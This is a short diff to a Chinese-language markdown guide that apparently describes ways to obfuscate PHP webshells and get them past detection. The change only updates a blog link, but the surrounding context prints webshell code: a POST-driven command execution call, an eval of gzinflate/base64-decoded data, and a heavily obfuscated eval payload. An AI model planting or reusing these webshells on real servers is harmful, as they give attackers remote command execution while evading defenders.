@@ -914,7 +914,7 @@ $f($_POST['aabyss']);      //system($_POST['aabyss']);
 eval(gzinflate(base64_decode('40pNzshXKMgoyMxLy9fQtFawtwMA'))); 
 ```
 
-加密手法可以看我写的博客： [https://blog.zgsec.cn/index.php/archives/147/](https://blog.zgsec.cn/index.php/archives/147/) 
+加密手法可以看我写的博客： [https://blog.zgsec.cn/archives/147.html](https://blog.zgsec.cn/archives/147.html) 
 
 ## 2# 字符串混淆处理绕过
 
@@ -1188,7 +1188,7 @@ $O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO
 eval($O00O0O("JE8wTzAwMD0iU0VCb1d4VGJ2SGhRTnFqeW5JUk1jbWxBS1lrWnVmVkpVQ2llYUxkc3J0Z3dGWER6cEdPUFdMY3NrZXpxUnJBVUtCU2hQREdZTUZOT25FYmp0d1pwYVZRZEh5Z0NJdnhUSmZYdW9pbWw3N3QvbFg5VEhyT0tWRlpTSGk4eE1pQVRIazVGcWh4b21UMG5sdTQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
 ```
 
-加密手法可以看我写的博客： [https://blog.zgsec.cn/index.php/archives/147/](https://blog.zgsec.cn/index.php/archives/147/) 
+加密手法可以看我写的博客： [https://blog.zgsec.cn/archives/147.html](https://blog.zgsec.cn/archives/147.html) 
 
 ## 9# 传参绕过
 
